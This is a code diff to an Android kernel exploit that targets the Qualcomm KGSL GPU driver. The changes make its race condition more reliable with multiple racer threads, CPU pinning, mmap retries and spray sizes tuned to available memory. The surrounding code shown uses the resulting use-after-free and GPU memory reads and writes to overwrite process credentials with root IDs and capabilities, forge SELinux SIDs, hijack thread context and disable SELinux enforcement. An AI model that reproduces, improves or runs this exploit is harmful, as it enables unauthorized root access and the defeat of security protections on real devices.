@@ -52,18 +52,21 @@
 #define BOGUS_START    0x0000000700204000ULL
 #define WRAP_SIZE      0xffffffffffefd000ULL
 
-#define MAX_CHILDREN 4096
+#define MAX_CHILDREN 16384
 #define CLEANUP_BATCH 64
 #define MAX_TASK_CANDIDATES 16
 #define SCAN_FAST_WORDS 64
 #define SCAN_FULL_WORDS (PAGE_SIZE / 8)
-#define SCAN_MAX_PAGES_PER_BATCH 512
-#define CRED_SCAN_PAGES_PER_BATCH 64
+#define SCAN_MAX_PAGES_PER_BATCH 2048
+#define CRED_SCAN_PAGES_PER_BATCH 256
 #define MAX_RACE_TRIES 20
+#define RACE_MMAP_TRIES 4096
+#define MAX_RACERS 4
 #define SCAN_MAX_PAGES 65540
 #define SCAN_FIRST_PAGE 1
 #define TASK_ADDR_LIMIT_BURST_REPEATS 16384
-#define KM_DUMP_BUFFER_SIZE 0x40000
+#define KM_DUMP_BUFFER_SIZE 0x100000
+#define IB_SIZE 0x1000000ULL
 #define KM_BUFFER_SIZE  0x2000
 #define KM_BACKUP_PATH  "/data/local/tmp/km_device_state.before.bin"
 #define KERNEL_DS       UINT64_MAX
@@ -120,6 +123,8 @@ struct found {
 static struct ctrl *ctrls;
 static int g_child_count = 4000;
 static size_t g_pressure_bytes = 2560UL * 1024 * 1024;
+static int g_racer_count = 1;
+static int g_race_delay_us = 30;
 static volatile int race_go;
 static int verbose = 1;
 static const struct target_profile *g_target;
@@ -286,6 +291,8 @@ static long long sec_dump_partition(const char *name, unsigned char *dst,
 static cpu_set_t g_allowed_cpus;
 static cpu_set_t g_park_mask;
 static int g_park_cpu = -1;
+static cpu_set_t g_race_mask;
+static int g_race_cpu = -1;
 static int futex_wait_int(volatile int *p, int val) { return (int)syscall(SYS_futex, (int *)p, FUTEX_WAIT, val, NULL, NULL, 0); }
 static int futex_wake_int(volatile int *p) { return (int)syscall(SYS_futex, (int *)p, FUTEX_WAKE, 1, NULL, NULL, 0); }
 
@@ -460,20 +467,38 @@ static int gpu_write_words(int fd, unsigned ctx, unsigned ib_id,
     return 0;
 }
 
-struct race_arg { int fd; volatile int started; int ret; int err; };
+struct race_arg {
+    int fd;
+    int delay_us;
+    volatile int started;
+    volatile int done;
+    int ret;
+    int err;
+};
+
 static void *bogus_racer(void *arg) {
     struct race_arg *ra = (struct race_arg *)arg;
+    if (g_race_cpu >= 0) {
+        pid_t tid = (pid_t)syscall(SYS_gettid);
+        (void)syscall(SYS_sched_setaffinity, tid, sizeof(g_race_mask),
+                        &g_race_mask);
+    }
     while (!race_go) { }
-    ra->started = 1;
-    __sync_synchronize();
+    if (ra->delay_us > 0)
+        usleep((useconds_t)ra->delay_us);
     struct kgsl_map_user_mem req = {0};
     req.fd = -1;
     req.len = WRAP_SIZE;
     req.hostptr = BOGUS_START;
     req.memtype = KGSL_USER_MEM_TYPE_ADDR;
     req.flags = KGSL_MEMFLAGS_USE_CPU_MAP;
+    ra->started = 1;
+    __sync_synchronize();
     int r = ioctl(ra->fd, IOCTL_KGSL_MAP_USER_MEM, &req);
-    ra->ret = r; ra->err = errno;
+    ra->ret = r;
+    ra->err = errno;
+    __sync_synchronize();
+    ra->done = 1;
     return NULL;
 }
 
@@ -514,18 +539,64 @@ static int race_once(int *out_fd, uint64_t *uaf_page) {
     struct kgsl_gpuobj_info pi = { .id = ph_id };
     ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &pi);
 
-    struct race_arg ra = { .fd = fd };
-    pthread_t th;
+    struct race_arg ra[MAX_RACERS];
+    pthread_t th[MAX_RACERS];
+    int created = 0;
+    memset(ra, 0, sizeof(ra));
+    memset(th, 0, sizeof(th));
     race_go = 0;
-    if (pthread_create(&th, NULL, bogus_racer, &ra) != 0) { perror("pthread"); goto fail; }
+    for (int i = 0; i < g_racer_count && i < MAX_RACERS; i++) {
+        ra[i].fd = fd;
+        ra[i].delay_us = i * 50;
+        if (pthread_create(&th[i], NULL, bogus_racer, &ra[i]) != 0) {
+            perror("pthread");
+            break;
+        }
+        created++;
+    }
     race_go = 1;
-    usleep(200);
-    errno = 0;
-    overlap_vma = mmap((void *)OVERLAP_START, overlap_mmap_size, PROT_READ|PROT_WRITE,
-                       MAP_SHARED|MAP_FIXED, fd, (off_t)overlap_id<<12);
-    int mmap_err = errno;
-    pthread_join(th, NULL);
-    if (overlap_vma == MAP_FAILED && mmap_err == ENODEV) {
+
+    int mmap_err = 0;
+    int won = 0;
+    if (created > 0) {
+        for (int spin = 0; spin < 2000000; spin++) {
+            int any = 0;
+            for (int i = 0; i < created; i++)
+                if (ra[i].started) { any = 1; break; }
+            if (any) break;
+            __asm__ volatile("yield" ::: "memory");
+        }
+        for (int attempt = 0; attempt < RACE_MMAP_TRIES; attempt++) {
+            if (attempt == 0 && g_race_delay_us > 0)
+                usleep((useconds_t)g_race_delay_us);
+            errno = 0;
+            overlap_vma = mmap((void *)OVERLAP_START, overlap_mmap_size,
+                               PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED,
+                               fd, (off_t)overlap_id<<12);
+            mmap_err = errno;
+            if (overlap_vma == MAP_FAILED && mmap_err == ENODEV) {
+                won = 1;
+                break;
+            }
+            if (overlap_vma != MAP_FAILED) {
+                /* The overlap VMA has already replaced the first bogus
+                 * hostptr page, so retrying this setup cannot hit the race
+                 * cleanly; drop it and let the caller start a fresh round. */
+                munmap(overlap_vma, overlap_mmap_size);
+                overlap_vma = NULL;
+                break;
+            }
+            int all_done = 1;
+            for (int i = 0; i < created; i++)
+                if (!ra[i].done) { all_done = 0; break; }
+            if (all_done) break;
+            __asm__ volatile("yield" ::: "memory");
+        }
+    }
+    for (int i = 0; i < created; i++)
+        pthread_join(th[i], NULL);
+
+    if (won) {
         printf("[!] RACE WON (uaf gpu=%llx)\n", (unsigned long long)uaf_gpu);
         struct kgsl_gpuobj_free fr = { .id = uaf_id };
         if (ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &fr) < 0) { perror("free uaf"); goto fail; }
@@ -539,7 +610,8 @@ static int race_once(int *out_fd, uint64_t *uaf_page) {
         return 0;
     }
     printf("[-] race lost (mmap=%p errno=%d racer ret=%d errno=%d)\n",
-           overlap_vma, mmap_err, ra.ret, ra.err);
+           overlap_vma, mmap_err,
+           created ? ra[0].ret : -1, created ? ra[0].err : 0);
 fail:
     if (overlap_vma && overlap_vma != MAP_FAILED) munmap(overlap_vma, overlap_mmap_size);
     if (ph_vma) munmap(ph_vma, ph_mmap_size);
@@ -748,7 +820,7 @@ static uint64_t sec_perm_arm(
     if ((task & 0xffff000000000000ULL) != 0xffff000000000000ULL) return 0;
 
     uint32_t context_words[2 * 13] = {0};
-    if (gpu_read_words(fd, ctx, ib_id, ib_gpu, ib_vma, 0x400000,
+    if (gpu_read_words(fd, ctx, ib_id, ib_gpu, ib_vma, IB_SIZE,
                        dump_id, dump_gpu, dump_vma,
                        root_child->page + g_target->task_cpu_context,
                        context_words, 26) < 0) {
@@ -825,7 +897,7 @@ static uint64_t sec_perm_arm(
         chain_words[2 * i] = sec_lo32(chain[i]);
         chain_words[2 * i + 1] = sec_hi32(chain[i]);
     }
-    if (gpu_write_words(fd, ctx, ib_id, ib_gpu, ib_vma, 0x400000,
+    if (gpu_write_words(fd, ctx, ib_id, ib_gpu, ib_vma, IB_SIZE,
                         root_child->page + g_target->task_fpsimd,
                         chain_words, 8) < 0) {
         perror("write hijack chain");
@@ -849,7 +921,7 @@ static uint64_t sec_perm_arm(
         return 0;
     }
 
-    if (gpu_write_words(fd, ctx, ib_id, ib_gpu, ib_vma, 0x400000,
+    if (gpu_write_words(fd, ctx, ib_id, ib_gpu, ib_vma, IB_SIZE,
                         root_child->page + g_target->task_cpu_context,
                         forged_words, 26) < 0) {
         perror("forge thread.cpu_context");
@@ -1582,7 +1654,7 @@ static int find_task_candidates(
                 uint64_t base = page + cand[k] - profile->task_comm;
                 if (base < uaf_base + PAGE_SIZE) continue;
                 uint32_t al[2] = {0};
-                if (gpu_read_words(fd, ctx, ib_id, ib_gpu, ib_vma, 0x400000,
+                if (gpu_read_words(fd, ctx, ib_id, ib_gpu, ib_vma, IB_SIZE,
                                    dump_id, dump_gpu, dump_vma,
                                    base + profile->task_addr_limit, al, 2) < 0)
                     continue;
@@ -1592,7 +1664,7 @@ static int find_task_candidates(
                     continue;
                 addr_limit_count++;
                 uint32_t tids[2] = {0};
-                if (gpu_read_words(fd, ctx, ib_id, ib_gpu, ib_vma, 0x400000,
+                if (gpu_read_words(fd, ctx, ib_id, ib_gpu, ib_vma, IB_SIZE,
                                    dump_id, dump_gpu, dump_vma,
                                    base + profile->task_pid, tids, 2) < 0)
                     continue;
@@ -1603,7 +1675,7 @@ static int find_task_candidates(
                 }
                 task_identity_count++;
                 uint32_t cw[2] = {0};
-                if (gpu_read_words(fd, ctx, ib_id, ib_gpu, ib_vma, 0x400000,
+                if (gpu_read_words(fd, ctx, ib_id, ib_gpu, ib_vma, IB_SIZE,
                                    dump_id, dump_gpu, dump_vma,
                                    base + profile->task_cred, cw, 2) < 0)
                     continue;
@@ -1613,7 +1685,7 @@ static int find_task_candidates(
                     continue;
                 cred_count++;
                 uint32_t real_words[2] = {0};
-                if (gpu_read_words(fd, ctx, ib_id, ib_gpu, ib_vma, 0x400000,
+                if (gpu_read_words(fd, ctx, ib_id, ib_gpu, ib_vma, IB_SIZE,
                                    dump_id, dump_gpu, dump_vma,
                                    base + profile->task_real_cred, real_words, 2) < 0)
                     continue;
@@ -1802,23 +1874,23 @@ static int patch_credential_alias(
     for (size_t i = 0; i < sizeof(root_caps) / sizeof(root_caps[0]); i++)
         root_caps[i] = cap_mask[i & 1];
 
-    if (gpu_write_words(fd, ctx, ib_id, ib_gpu, ib_vma, 0x400000,
+    if (gpu_write_words(fd, ctx, ib_id, ib_gpu, ib_vma, IB_SIZE,
                         candidate->alias + profile->cred_ids, root_ids,
                         CRED_IDS_LEN / sizeof(uint32_t)) < 0) {
         failure = errno ? errno : EIO;
         goto rollback;
     }
-    if (gpu_write_words(fd, ctx, ib_id, ib_gpu, ib_vma, 0x400000,
+    if (gpu_write_words(fd, ctx, ib_id, ib_gpu, ib_vma, IB_SIZE,
                         candidate->alias + profile->cred_caps, root_caps,
                         CRED_CAPS_LEN / sizeof(uint32_t)) < 0) {
         failure = errno ? errno : EIO;
         goto rollback;
     }
-    if (gpu_read_words(fd, ctx, ib_id, ib_gpu, ib_vma, 0x400000,
+    if (gpu_read_words(fd, ctx, ib_id, ib_gpu, ib_vma, IB_SIZE,
                        dump_id, dump_gpu, dump_vma,
                        candidate->alias + profile->cred_ids, observed_ids,
                        CRED_IDS_LEN / sizeof(uint32_t)) < 0 ||
-        gpu_read_words(fd, ctx, ib_id, ib_gpu, ib_vma, 0x400000,
+        gpu_read_words(fd, ctx, ib_id, ib_gpu, ib_vma, IB_SIZE,
                        dump_id, dump_gpu, dump_vma,
                        candidate->alias + profile->cred_caps, observed_caps,
                        CRED_CAPS_LEN / sizeof(uint32_t)) < 0) {
@@ -1833,10 +1905,10 @@ static int patch_credential_alias(
     return 0;
 
 rollback:
-    (void)gpu_write_words(fd, ctx, ib_id, ib_gpu, ib_vma, 0x400000,
+    (void)gpu_write_words(fd, ctx, ib_id, ib_gpu, ib_vma, IB_SIZE,
                           candidate->alias + profile->cred_caps,
                           candidate->caps, CRED_CAPS_LEN / sizeof(uint32_t));
-    (void)gpu_write_words(fd, ctx, ib_id, ib_gpu, ib_vma, 0x400000,
+    (void)gpu_write_words(fd, ctx, ib_id, ib_gpu, ib_vma, IB_SIZE,
                           candidate->alias + profile->cred_ids,
                           candidate->ids, CRED_IDS_LEN / sizeof(uint32_t));
     errno = failure;
@@ -1847,12 +1919,12 @@ static int restore_credential_alias(
         int fd, unsigned ctx, unsigned ib_id, uint64_t ib_gpu, void *ib_vma,
         const struct cred_alias_candidate *candidate,
         const struct target_profile *profile) {
-    if (gpu_write_words(fd, ctx, ib_id, ib_gpu, ib_vma, 0x400000,
+    if (gpu_write_words(fd, ctx, ib_id, ib_gpu, ib_vma, IB_SIZE,
                         candidate->alias + profile->cred_caps,
                         candidate->caps,
                         CRED_CAPS_LEN / sizeof(uint32_t)) < 0)
         return -1;
-    return gpu_write_words(fd, ctx, ib_id, ib_gpu, ib_vma, 0x400000,
+    return gpu_write_words(fd, ctx, ib_id, ib_gpu, ib_vma, IB_SIZE,
                            candidate->alias + profile->cred_ids,
                            candidate->ids,
                            CRED_IDS_LEN / sizeof(uint32_t));
@@ -1889,7 +1961,7 @@ static int patch_any_child_credential(
         struct cred_alias_candidate *cred_candidates = NULL;
         size_t cred_candidate_count = 0;
         if (scan_credential_aliases(
-                fd, ctx, ib_id, ib_gpu, ib_vma, 0x400000,
+                fd, ctx, ib_id, ib_gpu, ib_vma, IB_SIZE,
                 dump_id, dump_gpu, dump_vma, uaf_gpu,
                 &task_candidates[anchor], &cred_candidates,
                 &cred_candidate_count) < 0) {
@@ -1997,10 +2069,10 @@ static int write_task_addr_limit(int fd, unsigned ctx, unsigned ib_id,
 {
     uint32_t words[2], observed[2] = {0, 0};
     split64(value, &words[0], &words[1]);
-    if (gpu_write_words(fd, ctx, ib_id, ib_gpu, ib_vma, 0x400000,
+    if (gpu_write_words(fd, ctx, ib_id, ib_gpu, ib_vma, IB_SIZE,
                         task_alias + profile->task_addr_limit,
                         words, 2) < 0 ||
-        gpu_read_words(fd, ctx, ib_id, ib_gpu, ib_vma, 0x400000,
+        gpu_read_words(fd, ctx, ib_id, ib_gpu, ib_vma, IB_SIZE,
                        dump_id, dump_gpu, dump_vma,
                        task_alias + profile->task_addr_limit,
                        observed, 2) < 0)
@@ -2287,6 +2359,36 @@ static int pin_parent_for_spray(void) {
         errno = ENODEV;
         return -1;
     }
+    long configured_race = 0;
+    int race_env = read_env_long("KGSL_RACE_CPU", 0, CPU_SETSIZE - 1,
+                                 &configured_race);
+    if (race_env < 0) {
+        fprintf(stderr, "[-] KGSL_RACE_CPU must be between 0 and %d\n",
+                CPU_SETSIZE - 1);
+        return -1;
+    }
+    if (race_env > 0) {
+        g_race_cpu = (int)configured_race;
+        if (!CPU_ISSET(g_race_cpu, &g_allowed_cpus)) {
+            fprintf(stderr,
+                    "[-] KGSL_RACE_CPU %d is outside the allowed CPU set\n",
+                    g_race_cpu);
+            errno = EINVAL;
+            return -1;
+        }
+    } else {
+        g_race_cpu = -1;
+        for (int cpu = CPU_SETSIZE - 1; cpu >= 0; cpu--) {
+            if (CPU_ISSET(cpu, &g_allowed_cpus) && cpu != g_park_cpu) {
+                g_race_cpu = cpu;
+                break;
+            }
+        }
+        if (g_race_cpu < 0)
+            g_race_cpu = g_park_cpu;
+    }
+    CPU_ZERO(&g_race_mask);
+    CPU_SET(g_race_cpu, &g_race_mask);
     CPU_ZERO(&g_park_mask);
     CPU_SET(g_park_cpu, &g_park_mask);
     if (sched_setaffinity(0, sizeof(g_park_mask), &g_park_mask) < 0)
@@ -2296,8 +2398,8 @@ static int pin_parent_for_spray(void) {
         errno = EAGAIN;
         return -1;
     }
-    printf("[*] pinning KGSL race and child allocation to CPU %d\n",
-           g_park_cpu);
+    printf("[*] pinning child allocation to CPU %d, race mmap on CPU %d, racer(s) on CPU %d\n",
+           g_park_cpu, g_park_cpu, g_race_cpu);
     return 0;
 }
 
@@ -2328,7 +2430,7 @@ static void drain_kgsl_pool(void) {
 static void abandon_round(int *fd, unsigned *ib_id, void **ib_vma,
                           unsigned *dump_id, void **dump_vma) {
     if (*ib_vma) {
-        munmap(*ib_vma, 0x400000);
+        munmap(*ib_vma, IB_SIZE);
         *ib_vma = NULL;
     }
     if (*dump_vma) {
@@ -2370,6 +2472,43 @@ static void sec_report_permissive(uint64_t kaslr, pid_t pid) {
     else
         fprintf(stderr, "[-] hijack ran but selinux_state.enforcing still"
                         " reads %d\n", enforce);
+}
+
+static void choose_spray_defaults(int children_set, int pressure_set) {
+    unsigned long total_mb = 0, avail_mb = 0;
+    FILE *mem = fopen("/proc/meminfo", "r");
+    if (mem) {
+        char line[256];
+        while (fgets(line, sizeof(line), mem)) {
+            unsigned long kb;
+            if (sscanf(line, "MemTotal: %lu kB", &kb) == 1)
+                total_mb = kb / 1024;
+            else if (sscanf(line, "MemAvailable: %lu kB", &kb) == 1)
+                avail_mb = kb / 1024;
+        }
+        fclose(mem);
+    }
+    if (!children_set) {
+        int children = 4000;
+        if (total_mb >= 7000)
+            children = 8192;
+        else if (total_mb >= 5000)
+            children = 6144;
+        if (children > MAX_CHILDREN)
+            children = MAX_CHILDREN;
+        g_child_count = children;
+    }
+    if (!pressure_set) {
+        unsigned long base = avail_mb ? avail_mb : total_mb;
+        if (!base)
+            base = 4096;
+        unsigned long p = base * 60 / 100;
+        if (p < 1024)
+            p = 1024;
+        if (p > 4096)
+            p = 4096;
+        g_pressure_bytes = (size_t)p * 1024 * 1024;
+    }
 }
 
 int main(int argc, char **argv) {
@@ -2434,6 +2573,7 @@ int main(int argc, char **argv) {
         }
     }
     long configured = 0;
+    int children_set = 0, pressure_set = 0;
     int env_status = read_env_long("KGSL_CHILDREN", 512, MAX_CHILDREN,
                                    &configured);
     if (env_status < 0) {
@@ -2441,16 +2581,43 @@ int main(int argc, char **argv) {
                 MAX_CHILDREN);
         return 2;
     }
-    if (env_status > 0) g_child_count = (int)configured;
+    if (env_status > 0) {
+        g_child_count = (int)configured;
+        children_set = 1;
+    }
     env_status = read_env_long("KGSL_PRESSURE_MB", 0, 5120, &configured);
     if (env_status < 0) {
         fprintf(stderr, "[-] KGSL_PRESSURE_MB must be between 0 and 5120\n");
         return 2;
     }
-    if (env_status > 0)
+    if (env_status > 0) {
         g_pressure_bytes = (size_t)configured * 1024 * 1024;
-    printf("[*] spray profile children=%d pressure=%zu MiB\n",
-           g_child_count, g_pressure_bytes / (1024 * 1024));
+        pressure_set = 1;
+    }
+    long configured_racers = 1;
+    env_status = read_env_long("KGSL_RACERS", 1, MAX_RACERS,
+                               &configured_racers);
+    if (env_status < 0) {
+        fprintf(stderr, "[-] KGSL_RACERS must be between 1 and %d\n",
+                MAX_RACERS);
+        return 2;
+    }
+    if (env_status > 0)
+        g_racer_count = (int)configured_racers;
+    long configured_delay = 0;
+    env_status = read_env_long("KGSL_RACE_DELAY_US", 0, 100000,
+                               &configured_delay);
+    if (env_status < 0) {
+        fprintf(stderr, "[-] KGSL_RACE_DELAY_US must be between 0 and 100000\n");
+        return 2;
+    }
+    if (env_status > 0)
+        g_race_delay_us = (int)configured_delay;
+    if (!children_set || !pressure_set)
+        choose_spray_defaults(children_set, pressure_set);
+    printf("[*] spray profile children=%d pressure=%zu MiB racers=%d delay=%dus\n",
+           g_child_count, g_pressure_bytes / (1024 * 1024), g_racer_count,
+           g_race_delay_us);
     if (sec_sid_mode && getenv("SEC_LOG")) {
         void *log = mmap(NULL, SEC_LOG_SIZE, PROT_READ | PROT_WRITE,
                          MAP_SHARED | MAP_ANONYMOUS, -1, 0);
@@ -2545,7 +2712,7 @@ int main(int argc, char **argv) {
         for (int i = 0; i < g_child_count; i++)
             if (ctrls[i].pid > 0) alive++;
         printf("[*] children=%d\n", alive);
-        if (alive == 0 || wait_children_ready(alive, 10000) < 0) {
+        if (alive == 0 || wait_children_ready(alive, 30000) < 0) {
             fprintf(stderr, "[-] spray incomplete\n");
             abandon_round(&fd, &ib_id, &ib_vma, &dump_id, &dump_vma);
             continue;
@@ -2553,7 +2720,7 @@ int main(int argc, char **argv) {
         mark("children ready");
 
         if (kgsl_ctx(fd, &ctx) < 0 ||
-            kgsl_alloc(fd, 0x400000, &ib_id, &ib_gpu, &ib_vma, 0) < 0 ||
+            kgsl_alloc(fd, IB_SIZE, &ib_id, &ib_gpu, &ib_vma, 0) < 0 ||
             kgsl_alloc(fd, KM_DUMP_BUFFER_SIZE, &dump_id, &dump_gpu,
                        &dump_vma, 0) < 0) {
             abandon_round(&fd, &ib_id, &ib_vma, &dump_id, &dump_vma);
@@ -2561,7 +2728,7 @@ int main(int argc, char **argv) {
         }
 
         if (find_task_candidates(
-                fd, ctx, ib_id, ib_gpu, ib_vma, 0x400000,
+                fd, ctx, ib_id, ib_gpu, ib_vma, IB_SIZE,
                 dump_id, dump_gpu, dump_vma, uaf_gpu, g_target,
                 task_candidates, MAX_TASK_CANDIDATES,
                 &task_candidate_count) < 0) {
@@ -2606,7 +2773,7 @@ int main(int argc, char **argv) {
          * task_struct's own kernel address from task->group_leader (the child
          * is single threaded, so it points at itself). */
         uint32_t gl[2] = {0, 0};
-        if (gpu_read_words(fd, ctx, ib_id, ib_gpu, ib_vma, 0x400000,
+        if (gpu_read_words(fd, ctx, ib_id, ib_gpu, ib_vma, IB_SIZE,
                            dump_id, dump_gpu, dump_vma,
                            root_child.page + g_target->task_group_leader,
                            gl, 2) < 0) {
@@ -2637,13 +2804,13 @@ int main(int argc, char **argv) {
             printf("[*] forging SID %u\n", sid_value);
             uint32_t ptr[2] = {(uint32_t)forged_security,
                                (uint32_t)(forged_security >> 32)};
-            if (gpu_write_words(fd, ctx, ib_id, ib_gpu, ib_vma, 0x400000,
+            if (gpu_write_words(fd, ctx, ib_id, ib_gpu, ib_vma, IB_SIZE,
                                 root_child.page + g_target->task_fake_sec,
                                 ids, 2) < 0 ||
-                gpu_write_words(fd, ctx, ib_id, ib_gpu, ib_vma, 0x400000,
+                gpu_write_words(fd, ctx, ib_id, ib_gpu, ib_vma, IB_SIZE,
                                 root_child.page + g_target->task_security,
                                 ptr, 2) < 0 ||
-                gpu_write_words(fd, ctx, ib_id, ib_gpu, ib_vma, 0x400000,
+                gpu_write_words(fd, ctx, ib_id, ib_gpu, ib_vma, IB_SIZE,
                                 selected_cred_alias + g_target->cred_security,
                                 ptr, 2) < 0) {
                 perror("forge task_security_struct");
@@ -2663,7 +2830,7 @@ int main(int argc, char **argv) {
     if (run_kmunlock) {
         uint32_t security_words[2] = {0, 0};
         if (!selected_cred_alias ||
-            gpu_read_words(fd, ctx, ib_id, ib_gpu, ib_vma, 0x400000,
+            gpu_read_words(fd, ctx, ib_id, ib_gpu, ib_vma, IB_SIZE,
                            dump_id, dump_gpu, dump_vma,
                            selected_cred_alias + g_target->cred_security,
                            security_words, 2) < 0) {
@@ -2794,7 +2961,7 @@ int main(int argc, char **argv) {
         }
         int final = matched ? matched : (blk ? blk : (qse ? qse : 1));
         uint32_t final_ids[2] = {(uint32_t)final, (uint32_t)final};
-        (void)gpu_write_words(fd, ctx, ib_id, ib_gpu, ib_vma, 0x400000,
+        (void)gpu_write_words(fd, ctx, ib_id, ib_gpu, ib_vma, IB_SIZE,
                               forged_security, final_ids, 2);
         __sync_synchronize();
         if (matched) {
@@ -2944,7 +3111,7 @@ int main(int argc, char **argv) {
             handoff->start = 1;
             __sync_synchronize();
             if (service_sid_handoff(
-                    fd, ctx, ib_id, ib_gpu, ib_vma, 0x400000,
+                    fd, ctx, ib_id, ib_gpu, ib_vma, IB_SIZE,
                     dump_id, dump_gpu, dump_vma, root_child.pid,
                     root_child.page, g_target, handoff, 600000) < 0) {
                 qsee_status = errno ? errno : ETIMEDOUT;
